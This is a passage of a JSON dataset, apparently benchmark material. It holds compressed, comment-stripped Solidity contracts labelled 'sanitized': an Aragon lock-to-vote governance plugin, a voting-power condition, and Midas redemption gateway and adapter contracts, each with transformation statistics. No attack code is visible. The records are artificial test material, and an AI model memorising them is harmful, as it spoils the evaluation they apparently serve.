_proposalCount) {\nreturn;\n}\ncontinue;\n}\nif (plugin.usedVotingPower(_proposalId, msg.sender) > 0) {\nILockToVote(address(plugin)).clearVote(_proposalId, msg.sender);\n}\nunchecked {\n_i++;\n}\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 54,
        "mode": "compressed",
        "original_lines": 248,
        "transformed_lines": 140,
        "original_chars": 9107,
        "transformed_chars": 4901,
        "compression_ratio": 0.54
      },
      "error": null
    },
    {
      "original_id": "sn_gs_016",
      "transformed_id": "ss_l1_compressed_sn_gs_016",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.13;\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockToGovernBase} from \"./base/LockToGovernBase.sol\";\nimport {ILockToVote} from \"./interfaces/ILockToVote.sol\";\nimport {IDAO} from \"@aragon/osx-commons-contracts/src/dao/IDAO.sol\";\nimport {Action} from \"@aragon/osx-commons-contracts/src/executors/IExecutor.sol\";\nimport {IPlugin} from \"@aragon/osx-commons-contracts/src/plugin/IPlugin.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IProposal} from \"@aragon/osx-commons-contracts/src/plugin/extensions/proposal/IProposal.sol\";\nimport {ERC165Upgradeable} from \"@openzeppelin/contracts-upgradeable/utils/introspection/ERC165Upgradeable.sol\";\nimport {SafeCastUpgradeable} from \"@openzeppelin/contracts-upgradeable/utils/math/SafeCastUpgradeable.sol\";\nimport {MajorityVotingBase} from \"./base/MajorityVotingBase.sol\";\nimport {ILockToGovernBase} from \"./interfaces/ILockToGovernBase.sol\";\ncontract LockToVotePlugin is ILockToVote, MajorityVotingBase, LockToGovernBase {\nusing SafeCastUpgradeable for uint256;\nbytes4 internal constant LOCK_TO_VOTE_INTERFACE_ID =\nthis.minProposerVotingPower.selector ^ this.createProposal.selector;\nbytes32 public constant CREATE_PROPOSAL_PERMISSION_ID = keccak256(\"CREATE_PROPOSAL_PERMISSION\");\nbytes32 public constant LOCK_MANAGER_PERMISSION_ID = keccak256(\"LOCK_MANAGER_PERMISSION\");\nevent VoteCleared(uint256 proposalId, address voter);\nerror VoteRemovalForbidden(uint256 proposalId, address voter);\nfunction initialize(\nIDAO _dao,\nILockManager _lockManager,\nVotingSettings calldata _votingSettings,\nIPlugin.TargetConfig calldata _targetConfig,\nbytes calldata _pluginMetadata\n) external onlyCallAtInitialization reinitializer(1) {\n__MajorityVotingBase_init(_dao, _votingSettings, _targetConfig, _pluginMetadata);\n__LockToGovernBase_init(_lockManager);\nemit MembershipContractAnnounced({definingContract: address(_lockManager.token())});\n}\nfunction supportsInterface(bytes4 _interfaceId)\npublic\nview\nvirtual\noverride(MajorityVotingBase, LockToGovernBase)\nreturns (bool) {\nreturn _interfaceId == LOCK_TO_VOTE_INTERFACE_ID || _interfaceId == type(ILockToVote).interfaceId\n|| super.supportsInterface(_interfaceId);\n}\nfunction customProposalParamsABI() external pure override returns (string memory) {\nreturn \"(uint256 allowFailureMap)\";\n}\nfunction createProposal(\nbytes calldata _metadata,\nAction[] memory _actions,\nuint64 _startDate,\nuint64 _endDate,\nbytes memory _data\n) external auth(CREATE_PROPOSAL_PERMISSION_ID) returns (uint256 proposalId) {\nuint256 _allowFailureMap;\nif (_data.length != 0) {\n(_allowFailureMap) = abi.decode(_data, (uint256));\n}\nif (currentTokenSupply() == 0) {\nrevert NoVotingPower();\n}\n(_startDate, _endDate) = _validateProposalDates(_startDate, _endDate);\nproposalId = _createProposalId(keccak256(abi.encode(_actions, _metadata)));\nif (_proposalExists(proposalId)) {\nrevert ProposalAlreadyExists(proposalId);\n}\nProposal storage proposal_ = proposals[proposalId];\nproposal_.parameters.votingMode = votingMode();\nproposal_.parameters.supportThresholdRatio = supportThresholdRatio();\nproposal_.parameters.startDate = _startDate;\nproposal_.parameters.endDate = _endDate;\nproposal_.parameters.minParticipationRatio = minParticipationRatio();\nproposal_.parameters.minApprovalRatio = minApprovalRatio();\nproposal_.targetConfig = getTargetConfig();\nif (_allowFailureMap != 0) {\nproposal_.allowFailureMap = _allowFailureMap;\n}\nfor (uint256 i; i < _actions.length;) {\nproposal_.actions.push(_actions[i]);\nunchecked {\n++i;\n}\n}\nemit ProposalCreated(proposalId, _msgSender(), _startDate, _endDate, _metadata, _actions, _allowFailureMap);\nlockManager.proposalCreated(proposalId);\n}\nfunction canVote(uint256 _proposalId, address _voter, VoteOption _voteOption) public view returns (bool) {\nif (!_proposalExists(_proposalId)) {\nrevert NonexistentProposal(_proposalId);\n}\nProposal storage proposal_ = proposals[_proposalId];\nreturn _canVote(proposal_, _voter, _voteOption, lockManager.getLockedBalance(_voter));\n}\nfunction vote(uint256 _proposalId, address _voter, VoteOption _voteOption, uint256 _newVotingPower)\npublic\noverride\nauth(LOCK_MANAGER_PERMISSION_ID) {\nProposal storage proposal_ = proposals[_proposalId];\nif (!_canVote(proposal_, _voter, _voteOption, _newVotingPower)) {\nrevert VoteCastForbidden(_proposalId, _voter);\n}\nif (_voteOption == proposal_.votes[_voter].voteOption) {\nif (_newVotingPower == proposal_.votes[_voter].votingPower) return;\nuint256 diff = _newVotingPower - proposal_.votes[_voter].votingPower;\nproposal_.votes[_voter].votingPower = _newVotingPower;\nif (proposal_.votes[_voter].voteOption == VoteOption.Yes) {\nproposal_.tally.yes += diff;\n} else if (proposal_.votes[_voter].voteOption == VoteOption.No) {\nproposal_.tally.no += diff;\n} else {\nproposal_.tally.abstain += diff;\n}\n} else {\nif (proposal_.votes[_voter].votingPower > 0) {\nif (proposal_.votes[_voter].voteOption == VoteOption.Yes) {\nproposal_.tally.yes -= proposal_.votes[_voter].votingPower;\n} else if (proposal_.votes[_voter].voteOption == VoteOption.No) {\nproposal_.tally.no -= proposal_.votes[_voter].votingPower;\n} else {\nproposal_.tally.abstain -= proposal_.votes[_voter].votingPower;\n}\n}\nif (_voteOption == VoteOption.Yes) {\nproposal_.tally.yes += _newVotingPower;\n} else if (_voteOption == VoteOption.No) {\nproposal_.tally.no += _newVotingPower;\n} else {\nproposal_.tally.abstain += _newVotingPower;\n}\nproposal_.votes[_voter].voteOption = _voteOption;\nproposal_.votes[_voter].votingPower = _newVotingPower;\n}\nemit VoteCast(_proposalId, _voter, _voteOption, _newVotingPower);\nif (proposal_.parameters.votingMode == VotingMode.EarlyExecution) {\n_attemptEarlyExecution(_proposalId, _msgSender());\n}\n}\nfunction clearVote(uint256 _proposalId, address _voter) external auth(LOCK_MANAGER_PERMISSION_ID) {\nProposal storage proposal_ = proposals[_proposalId];\nif (!_isProposalOpen(proposal_)) {\nrevert VoteRemovalForbidden(_proposalId, _voter);\n} else if (proposal_.parameters.votingMode != VotingMode.VoteReplacement) {\nrevert VoteRemovalForbidden(_proposalId, _voter);\n} else if (proposal_.votes[_voter].votingPower == 0) {\nreturn;\n}\nif (proposal_.votes[_voter].voteOption == VoteOption.Yes) {\nproposal_.tally.yes -= proposal_.votes[_voter].votingPower;\n} else if (proposal_.votes[_voter].voteOption == VoteOption.No) {\nproposal_.tally.no -= proposal_.votes[_voter].votingPower;\n}\nelse if (proposal_.votes[_voter].voteOption == VoteOption.Abstain) {\nproposal_.tally.abstain -= proposal_.votes[_voter].votingPower;\n}\nproposal_.votes[_voter].votingPower = 0;\nemit VoteCleared(_proposalId, _voter);\n}\nfunction isProposalOpen(uint256 _proposalId) external view returns (bool) {\nProposal storage proposal_ = proposals[_proposalId];\nreturn _isProposalOpen(proposal_);\n}\nfunction minProposerVotingPower() public view override(ILockToGovernBase, MajorityVotingBase) returns (uint256) {\nreturn MajorityVotingBase.minProposerVotingPower();\n}\nfunction currentTokenSupply() public view override returns (uint256) {\nreturn IERC20(lockManager.token()).totalSupply();\n}\nfunction usedVotingPower(uint256 _proposalId, address _voter) public view returns (uint256) {\nreturn proposals[_proposalId].votes[_voter].votingPower;\n}\nfunction _canVote(Proposal storage proposal_, address _voter, VoteOption _voteOption, uint256 _newVotingPower)\ninternal\nview\nreturns (bool) {\nuint256 _currentVotingPower = proposal_.votes[_voter].votingPower;\nif (!_isProposalOpen(proposal_)) {\nreturn false;\n} else if (_voteOption == VoteOption.None) {\nreturn false;\n}\nelse if (proposal_.parameters.votingMode != VotingMode.VoteReplacement) {\nif (_newVotingPower <= _currentVotingPower) {\nreturn false;\n}\nelse if (\nproposal_.votes[_voter].voteOption != VoteOption.None\n&& _voteOption != proposal_.votes[_voter].voteOption\n) {\nreturn false;\n}\n}\nelse {\nif (_newVotingPower == 0 || _newVotingPower < _currentVotingPower) {\nreturn false;\n}\nelse if (_newVotingPower == _currentVotingPower && _voteOption == proposal_.votes[_voter].voteOption) {\nreturn false;\n}\n}\nreturn true;\n}\nfunction _attemptEarlyExecution(uint256 _proposalId, address _voteCaller) internal {\nif (!_canExecute(_proposalId)) {\nreturn;\n} else if (!dao().hasPermission(address(this), _voteCaller, EXECUTE_PROPOSAL_PERMISSION_ID, _msgData())) {\nreturn;\n}\n_execute(_proposalId);\n}\nfunction _execute(uint256 _proposalId) internal override {\nsuper._execute(_proposalId);\nlockManager.proposalEnded(_proposalId);\n}\nuint256[50] private __gap;\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 65,
        "mode": "compressed",
        "original_lines": 325,
        "transformed_lines": 212,
        "original_chars": 13835,
        "transformed_chars": 8467,
        "compression_ratio": 0.61
      },
      "error": null
    },
    {
      "original_id": "sn_gs_017",
      "transformed_id": "ss_l1_compressed_sn_gs_017",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.8;\nimport {ILockToGovernBase} from \"../interfaces/ILockToGovernBase.sol\";\nimport {ILockManager} from \"../interfaces/ILockManager.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IPermissionCondition} from \"@aragon/osx-commons-contracts/src/permission/condition/IPermissionCondition.sol\";\nimport {PermissionCondition} from \"@aragon/osx-commons-contracts/src/permission/condition/PermissionCondition.sol\";\ncontract MinVotingPowerCondition is PermissionCondition {\nILockToGovernBase public immutable plugin;\nILockManager public immutable lockManager;\nIERC20 public immutable token;\nconstructor(ILockToGovernBase _plugin) {\nplugin = _plugin;\ntoken = plugin.token();\nlockManager = plugin.lockManager();\n}\nfunction isGranted(address _where, address _who, bytes32 _permissionId, bytes calldata _data)\npublic\nview\noverride\nreturns (bool) {\n(_where, _data, _permissionId);\nuint256 _currentBalance = token.balanceOf(_who) + lockManager.getLockedBalance(_who);\nuint256 _minProposerVotingPower = plugin.minProposerVotingPower();\nreturn _currentBalance >= _minProposerVotingPower;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 51,
        "transformed_lines": 26,
        "original_chars": 2220,
        "transformed_chars": 1128,
        "compression_ratio": 0.51
      },
      "error": null
    },
    {
      "original_id": "sn_gs_018",
      "transformed_id": "ss_l1_compressed_sn_gs_018",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.13;\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockToGovernBase} from \"./base/LockToGovernBase.sol\";\nimport {ILockToVote} from \"./interfaces/ILockToVote.sol\";\nimport {IDAO} from \"@aragon/osx-commons-contracts/src/dao/IDAO.sol\";\nimport {Action} from \"@aragon/osx-commons-contracts/src/executors/IExecutor.sol\";\nimport {IPlugin} from \"@aragon/osx-commons-contracts/src/plugin/IPlugin.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IProposal} from \"@aragon/osx-commons-contracts/src/plugin/extensions/proposal/IProposal.sol\";\nimport {ERC165Upgradeable} from \"@openzeppelin/contracts-upgradeable/utils/introspection/ERC165Upgradeable.sol\";\nimport {SafeCastUpgradeable} from \"@openzeppelin/contracts-upgradeable/utils/math/SafeCastUpgradeable.sol\";\nimport {MajorityVotingBase} from \"./base/MajorityVotingBase.sol\";\nimport {ILockToGovernBase} from \"./interfaces/ILockToGovernBase.sol\";\ncontract LockToVotePlugin is ILockToVote, MajorityVotingBase, LockToGovernBase {\nusing SafeCastUpgradeable for uint256;\nbytes4 internal constant LOCK_TO_VOTE_INTERFACE_ID =\nthis.minProposerVotingPower.selector ^ this.createProposal.selector;\nbytes32 public constant CREATE_PROPOSAL_PERMISSION_ID = keccak256(\"CREATE_PROPOSAL_PERMISSION\");\nbytes32 public constant LOCK_MANAGER_PERMISSION_ID = keccak256(\"LOCK_MANAGER_PERMISSION\");\nevent VoteCleared(uint256 proposalId, address voter);\nerror VoteRemovalForbidden(uint256 proposalId, address voter);\nfunction initialize(\nIDAO _dao,\nILockManager _lockManager,\nVotingSettings calldata _votingSettings,\nIPlugin.TargetConfig calldata _targetConfig,\nbytes calldata _pluginMetadata\n) external onlyCallAtInitialization reinitializer(1) {\n__MajorityVotingBase_init(_dao, _votingSettings, _targetConfig, _pluginMetadata);\n__LockToGovernBase_init(_lockManager);\nemit MembershipContractAnnounced({definingContract: address(_lockManager.token())});\n}\nfunction supportsInterface(bytes4 _interfaceId)\npublic\nview\nvirtual\noverride(MajorityVotingBase, LockToGovernBase)\nreturns (bool) {\nreturn _interfaceId == LOCK_TO_VOTE_INTERFACE_ID || _interfaceId == type(ILockToVote).interfaceId\n|| super.supportsInterface(_interfaceId);\n}\nfunction customProposalParamsABI() external pure override returns (string memory) {\nreturn \"(uint256 allowFailureMap)\";\n}\nfunction createProposal(\nbytes calldata _metadata,\nAction[] memory _actions,\nuint64 _startDate,\nuint64 _endDate,\nbytes memory _data\n) external auth(CREATE_PROPOSAL_PERMISSION_ID) returns (uint256 proposalId) {\nuint256 _allowFailureMap;\nif (_data.length != 0) {\n(_allowFailureMap) = abi.decode(_data, (uint256));\n}\nif (currentTokenSupply() == 0) {\nrevert NoVotingPower();\n}\n(_startDate, _endDate) = _validateProposalDates(_startDate, _endDate);\nproposalId = _createProposalId(keccak256(abi.encode(_actions, _metadata)));\nif (_proposalExists(proposalId)) {\nrevert ProposalAlreadyExists(proposalId);\n}\nProposal storage proposal_ = proposals[proposalId];\nproposal_.parameters.votingMode = votingMode();\nproposal_.parameters.supportThresholdRatio = supportThresholdRatio();\nproposal_.parameters.startDate = _startDate;\nproposal_.parameters.endDate = _endDate;\nproposal_.parameters.minParticipationRatio = minParticipationRatio();\nproposal_.parameters.minApprovalRatio = minApprovalRatio();\nproposal_.targetConfig = getTargetConfig();\nif (_allowFailureMap != 0) {\nproposal_.allowFailureMap = _allowFailureMap;\n}\nfor (uint256 i; i < _actions.length;) {\nproposal_.actions.push(_actions[i]);\nunchecked {\n++i;\n}\n}\nemit ProposalCreated(proposalId, _msgSender(), _startDate, _endDate, _metadata, _actions, _allowFailureMap);\nlockManager.proposalCreated(proposalId);\n}\nfunction canVote(uint256 _proposalId, address _voter, VoteOption _voteOption) public view returns (bool) {\nif (!_proposalExists(_proposalId)) {\nrevert NonexistentProposal(_proposalId);\n}\nProposal storage proposal_ = proposals[_proposalId];\nreturn _canVote(proposal_, _voter, _voteOption, lockManager.getLockedBalance(_voter));\n}\nfunction vote(uint256 _proposalId, address _voter, VoteOption _voteOption, uint256 _newVotingPower)\npublic\noverride\nauth(LOCK_MANAGER_PERMISSION_ID) {\nProposal storage proposal_ = proposals[_proposalId];\nif (!_canVote(proposal_, _voter, _voteOption, _newVotingPower)) {\nrevert VoteCastForbidden(_proposalId, _voter);\n}\nif (_voteOption == proposal_.votes[_voter].voteOption) {\nif (_newVotingPower == proposal_.votes[_voter].votingPower) return;\nuint256 diff = _newVotingPower - proposal_.votes[_voter].votingPower;\nproposal_.votes[_voter].votingPower = _newVotingPower;\nif (proposal_.votes[_voter].voteOption == VoteOption.Yes) {\nproposal_.tally.yes += diff;\n} else if (proposal_.votes[_voter].voteOption == VoteOption.No) {\nproposal_.tally.no += diff;\n} else {\nproposal_.tally.abstain += diff;\n}\n} else {\nif (proposal_.votes[_voter].votingPower > 0) {\nif (proposal_.votes[_voter].voteOption == VoteOption.Yes) {\nproposal_.tally.yes -= proposal_.votes[_voter].votingPower;\n} else if (proposal_.votes[_voter].voteOption == VoteOption.No) {\nproposal_.tally.no -= proposal_.votes[_voter].votingPower;\n} else {\nproposal_.tally.abstain -= proposal_.votes[_voter].votingPower;\n}\n}\nif (_voteOption == VoteOption.Yes) {\nproposal_.tally.yes += _newVotingPower;\n} else if (_voteOption == VoteOption.No) {\nproposal_.tally.no += _newVotingPower;\n} else {\nproposal_.tally.abstain += _newVotingPower;\n}\nproposal_.votes[_voter].voteOption = _voteOption;\nproposal_.votes[_voter].votingPower = _newVotingPower;\n}\nemit VoteCast(_proposalId, _voter, _voteOption, _newVotingPower);\nif (proposal_.parameters.votingMode == VotingMode.EarlyExecution) {\n_attemptEarlyExecution(_proposalId, _msgSender());\n}\n}\nfunction clearVote(uint256 _proposalId, address _voter) external auth(LOCK_MANAGER_PERMISSION_ID) {\nProposal storage proposal_ = proposals[_proposalId];\nif (!_isProposalOpen(proposal_)) {\nrevert VoteRemovalForbidden(_proposalId, _voter);\n} else if (proposal_.parameters.votingMode != VotingMode.VoteReplacement) {\nrevert VoteRemovalForbidden(_proposalId, _voter);\n} else if (proposal_.votes[_voter].votingPower == 0) {\nreturn;\n}\nif (proposal_.votes[_voter].voteOption == VoteOption.Yes) {\nproposal_.tally.yes -= proposal_.votes[_voter].votingPower;\n} else if (proposal_.votes[_voter].voteOption == VoteOption.No) {\nproposal_.tally.no -= proposal_.votes[_voter].votingPower;\n}\nelse if (proposal_.votes[_voter].voteOption == VoteOption.Abstain) {\nproposal_.tally.abstain -= proposal_.votes[_voter].votingPower;\n}\nproposal_.votes[_voter].votingPower = 0;\nemit VoteCleared(_proposalId, _voter);\n}\nfunction isProposalOpen(uint256 _proposalId) external view returns (bool) {\nProposal storage proposal_ = proposals[_proposalId];\nreturn _isProposalOpen(proposal_);\n}\nfunction minProposerVotingPower() public view override(ILockToGovernBase, MajorityVotingBase) returns (uint256) {\nreturn MajorityVotingBase.minProposerVotingPower();\n}\nfunction currentTokenSupply() public view override returns (uint256) {\nreturn IERC20(lockManager.token()).totalSupply();\n}\nfunction usedVotingPower(uint256 _proposalId, address _voter) public view returns (uint256) {\nreturn proposals[_proposalId].votes[_voter].votingPower;\n}\nfunction _canVote(Proposal storage proposal_, address _voter, VoteOption _voteOption, uint256 _newVotingPower)\ninternal\nview\nreturns (bool) {\nuint256 _currentVotingPower = proposal_.votes[_voter].votingPower;\nif (!_isProposalOpen(proposal_)) {\nreturn false;\n} else if (_voteOption == VoteOption.None) {\nreturn false;\n}\nelse if (proposal_.parameters.votingMode != VotingMode.VoteReplacement) {\nif (_newVotingPower <= _currentVotingPower) {\nreturn false;\n}\nelse if (\nproposal_.votes[_voter].voteOption != VoteOption.None\n&& _voteOption != proposal_.votes[_voter].voteOption\n) {\nreturn false;\n}\n}\nelse {\nif (_newVotingPower == 0 || _newVotingPower < _currentVotingPower) {\nreturn false;\n}\nelse if (_newVotingPower == _currentVotingPower && _voteOption == proposal_.votes[_voter].voteOption) {\nreturn false;\n}\n}\nreturn true;\n}\nfunction _attemptEarlyExecution(uint256 _proposalId, address _voteCaller) internal {\nif (!_canExecute(_proposalId)) {\nreturn;\n} else if (!dao().hasPermission(address(this), _voteCaller, EXECUTE_PROPOSAL_PERMISSION_ID, _msgData())) {\nreturn;\n}\n_execute(_proposalId);\n}\nfunction _execute(uint256 _proposalId) internal override {\nsuper._execute(_proposalId);\nlockManager.proposalEnded(_proposalId);\n}\nuint256[50] private __gap;\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 65,
        "mode": "compressed",
        "original_lines": 325,
        "transformed_lines": 212,
        "original_chars": 13835,
        "transformed_chars": 8467,
        "compression_ratio": 0.61
      },
      "error": null
    },
    {
      "original_id": "sn_gs_019",
      "transformed_id": "ss_l1_compressed_sn_gs_019",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.23;\nimport {ReentrancyGuardTrait} from \"@gearbox-protocol/core-v3/contracts/traits/ReentrancyGuardTrait.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IERC20Metadata} from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {IMidasRedemptionVault} from \"../../integrations/midas/IMidasRedemptionVault.sol\";\nimport {IMidasRedemptionVaultGateway} from \"../../interfaces/midas/IMidasRedemptionVaultGateway.sol\";\ncontract MidasRedemptionVaultGateway is ReentrancyGuardTrait, IMidasRedemptionVaultGateway {\nusing SafeERC20 for IERC20;\nbytes32 public constant override contractType = \"GATEWAY::MIDAS_REDEMPTION_VAULT\";\nuint256 public constant override version = 3_10;\naddress public immutable midasRedemptionVault;\naddress public immutable mToken;\nmapping(address => PendingRedemption) public pendingRedemptions;\nconstructor(address _midasRedemptionVault) {\nmidasRedemptionVault = _midasRedemptionVault;\nmToken = IMidasRedemptionVault(_midasRedemptionVault).mToken();\n}\nfunction redeemInstant(address tokenOut, uint256 amountMTokenIn, uint256 minReceiveAmount) external nonReentrant {\nIERC20(mToken).safeTransferFrom(msg.sender, address(this), amountMTokenIn);\nuint256 balanceBefore = IERC20(tokenOut).balanceOf(address(this));\nIERC20(mToken).forceApprove(midasRedemptionVault, amountMTokenIn);\nIMidasRedemptionVault(midasRedemptionVault).redeemInstant(tokenOut, amountMTokenIn, minReceiveAmount);\nuint256 amount = IERC20(tokenOut).balanceOf(address(this)) - balanceBefore;\nIERC20(tokenOut).safeTransfer(msg.sender, amount);\n}\nfunction requestRedeem(address tokenOut, uint256 amountMTokenIn) external nonReentrant {\nif (pendingRedemptions[msg.sender].isActive) {\nrevert(\"MidasRedemptionVaultGateway: user has a pending redemption\");\n}\nuint256 requestId = IMidasRedemptionVault(midasRedemptionVault).currentRequestId();\nIERC20(mToken).safeTransferFrom(msg.sender, address(this), amountMTokenIn);\nIERC20(mToken).forceApprove(midasRedemptionVault, amountMTokenIn);\nIMidasRedemptionVault(midasRedemptionVault).redeemRequest(tokenOut, amountMTokenIn);\npendingRedemptions[msg.sender] =\nPendingRedemption({isActive: true, requestId: requestId, timestamp: block.timestamp, remainder: 0});\n}\nfunction withdraw(uint256 amount) external nonReentrant {\nPendingRedemption memory pending = pendingRedemptions[msg.sender];\nif (!pending.isActive) {\nrevert(\"MidasRedemptionVaultGateway: user does not have a pending redemption\");\n}\n(\naddress sender,\naddress tokenOut,\nuint8 status,\nuint256 amountMTokenIn,\nuint256 mTokenRate,\nuint256 tokenOutRate\n) = IMidasRedemptionVault(midasRedemptionVault).redeemRequests(pending.requestId);\nif (sender != address(this)) {\nrevert(\"MidasRedemptionVaultGateway: invalid request\");\n}\nif (status != 1) {\nrevert(\"MidasRedemptionVaultGateway: redemption not fulfilled\");\n}\nuint256 availableAmount;\nif (pending.remainder > 0) {\navailableAmount = pending.remainder;\n} else {\navailableAmount = _calculateTokenOutAmount(amountMTokenIn, mTokenRate, tokenOutRate, tokenOut);\n}\nif (amount > availableAmount) {\nrevert(\"MidasRedemptionVaultGateway: amount exceeds available\");\n}\nif (amount == availableAmount) {\ndelete pendingRedemptions[msg.sender];\n} else {\npendingRedemptions[msg.sender].remainder = availableAmount - amount;\n}\nIERC20(tokenOut).safeTransfer(msg.sender, amount);\n}\nfunction pendingTokenOutAmount(address user, address tokenOut) external view returns (uint256) {\nPendingRedemption memory pending = pendingRedemptions[user];\nif (!pending.isActive) {\nreturn 0;\n}\n(address sender, address requestTokenOut,, uint256 amountMTokenIn, uint256 mTokenRate, uint256 tokenOutRate) =\nIMidasRedemptionVault(midasRedemptionVault).redeemRequests(pending.requestId);\nif (sender != address(this) || requestTokenOut != tokenOut) {\nreturn 0;\n}\nif (pending.remainder > 0) {\nreturn pending.remainder;\n} else {\nreturn _calculateTokenOutAmount(amountMTokenIn, mTokenRate, tokenOutRate, tokenOut);\n}\n}\nfunction _calculateTokenOutAmount(\nuint256 amountMTokenIn,\nuint256 mTokenRate,\nuint256 tokenOutRate,\naddress tokenOut\n) internal view returns (uint256) {\nuint256 amount1e18 = (amountMTokenIn * mTokenRate) / tokenOutRate;\nuint256 tokenUnit = 10 ** IERC20Metadata(tokenOut).decimals();\nreturn amount1e18 * tokenUnit / 1e18;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 36,
        "mode": "compressed",
        "original_lines": 163,
        "transformed_lines": 99,
        "original_chars": 6944,
        "transformed_chars": 4387,
        "compression_ratio": 0.63
      },
      "error": null
    },
    {
      "original_id": "sn_gs_020",
      "transformed_id": "ss_l1_compressed_sn_gs_020",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.23;\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IERC20Metadata} from \"@openzeppelin/contracts/interfaces/IERC20Metadata.sol\";\nimport {EnumerableSet} from \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\nimport {AbstractAdapter} from \"../AbstractAdapter.sol\";\nimport {NotImplementedException} from \"@gearbox-protocol/core-v3/contracts/interfaces/IExceptions.sol\";\nimport {IMidasRedemptionVault} from \"../../integrations/midas/IMidasRedemptionVault.sol\";\nimport {IMidasRedemptionVaultAdapter} from \"../../interfaces/midas/IMidasRedemptionVaultAdapter.sol\";\nimport {IMidasRedemptionVaultGateway} from \"../../interfaces/midas/IMidasRedemptionVaultGateway.sol\";\nimport {WAD, RAY} from \"@gearbox-protocol/core-v3/contracts/libraries/Constants.sol\";\ncontract MidasRedemptionVaultAdapter is AbstractAdapter, IMidasRedemptionVaultAdapter {\nusing EnumerableSet for EnumerableSet.AddressSet;\nbytes32 public constant override contractType = \"ADAPTER::MIDAS_REDEMPTION_VAULT\";\nuint256 public constant override version = 3_10;\naddress public immutable override mToken;\naddress public immutable override gateway;\nmapping(address => address) public phantomTokenToOutputToken;\nmapping(address => address) public outputTokenToPhantomToken;\nEnumerableSet.AddressSet internal _allowedTokens;\nconstructor(address _creditManager, address _gateway) AbstractAdapter(_creditManager, _gateway) {\ngateway = _gateway;\nmToken = IMidasRedemptionVaultGateway(_gateway).mToken();\n_getMaskOrRevert(mToken);\n}\nfunction redeemInstant(address tokenOut, uint256 amountMTokenIn, uint256 minReceiveAmount)\nexternal\noverride\ncreditFacadeOnly\nreturns (bool) {\nif (!isTokenAllowed(tokenOut)) revert TokenNotAllowedException();\n_redeemInstant(tokenOut, amountMTokenIn, minReceiveAmount);\nreturn false;\n}\nfunction redeemInstantDiff(address tokenOut, uint256 leftoverAmount, uint256 rateMinRAY)\nexternal\noverride\ncreditFacadeOnly\nreturns (bool) {\nif (!isTokenAllowed(tokenOut)) revert TokenNotAllowedException();\naddress creditAccount = _creditAccount();\nuint256 balance = IERC20(mToken).balanceOf(creditAccount);\nif (balance > leftoverAmount) {\nunchecked {\nuint256 amount = balance - leftoverAmount;\nuint256 minReceiveAmount = (amount * rateMinRAY) / RAY;\n_redeemInstant(tokenOut, amount, minReceiveAmount);\n}\n}\nreturn false;\n}\nfunction _redeemInstant(address tokenOut, uint256 amountMTokenIn, uint256 minReceiveAmount) internal {\n_executeSwapSafeApprove(\nmToken,\nabi.encodeCall(\nIMidasRedemptionVaultGateway.redeemInstant,\n(tokenOut, amountMTokenIn, _convertToE18(minReceiveAmount, tokenOut))\n)\n);\n}\nfunction redeemRequest(address tokenOut, uint256 amountMTokenIn)\nexternal\noverride\ncreditFacadeOnly\nreturns (bool) {\nif (!isTokenAllowed(tokenOut) || outputTokenToPhantomToken[tokenOut] == address(0)) {\nrevert TokenNotAllowedException();\n}\n_executeSwapSafeApprove(\nmToken, abi.encodeCall(IMidasRedemptionVaultGateway.requestRedeem, (tokenOut, amountMTokenIn))\n);\nreturn true;\n}\nfunction withdraw(uint256 amount) external override creditFacadeOnly returns (bool) {\n_withdraw(amount);\nreturn false;\n}\nfunction _withdraw(uint256 amount) internal {\n_execute(abi.encodeCall(IMidasRedemptionVaultGateway.withdraw, (amount)));\n}\nfunction withdrawPhantomToken(address token, uint256 amount) external override creditFacadeOnly returns (bool) {\nif (phantomTokenToOutputToken[token] == address(0)) revert IncorrectStakedPhantomTokenException();\n_withdraw(amount);\nreturn false;\n}\nfunction depositPhantomToken(address, uint256) external pure override returns (bool) {\nrevert NotImplementedException();\n}\nfunction _convertToE18(uint256 amount, address token) internal view returns (uint256) {\nuint256 tokenUnit = 10 ** IERC20Metadata(token).decimals();\nreturn amount * WAD / tokenUnit;\n}\nfunction isTokenAllowed(address token) public view override returns (bool) {\nreturn _allowedTokens.contains(token);\n}\nfunction allowedTokens() public view override returns (address[] memory) {\nreturn _allowedTokens.values();\n}\nfunction setTokenAllowedStatusBatch(MidasAllowedTokenStatus[] calldata configs)\nexternal\noverride\nconfiguratorOnly {\nuint256 len = configs.length;\nfor (uint256 i; i < len; ++i) {\nMidasAllowedTokenStatus memory config = configs[i];\nif (config.allowed) {\n_getMaskOrRevert(config.token);\n_allowedTokens.add(config.token);\nif (config.phantomToken != address(0)) 